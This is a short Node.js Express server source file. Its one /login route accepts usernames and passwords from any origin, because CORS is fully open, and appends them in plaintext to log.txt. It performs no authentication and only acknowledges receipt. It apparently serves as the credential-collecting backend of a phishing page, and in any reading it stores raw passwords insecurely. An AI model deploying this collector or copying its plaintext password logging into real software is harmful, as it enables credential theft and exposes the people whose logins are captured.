const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors'); // Import the CORS package
const app = express();
const PORT = 3000;

// Enable CORS
app.use(cors());

// Middleware to parse JSON data
app.use(express.json());

// Route to handle login data
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  const logData = `Username: ${username}, Password: ${password}\n`;

  // Append the data to log.txt
  fs.appendFile(path.join(__dirname, 'log.txt'), logData, (err) => {
    if (err) {
      console.error("Error writing to file:", err);
      return res.status(500).send('Error saving login information');
    }
    console.log("Login information saved successfully.");
    res.status(200).send('Login information received');
  });
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
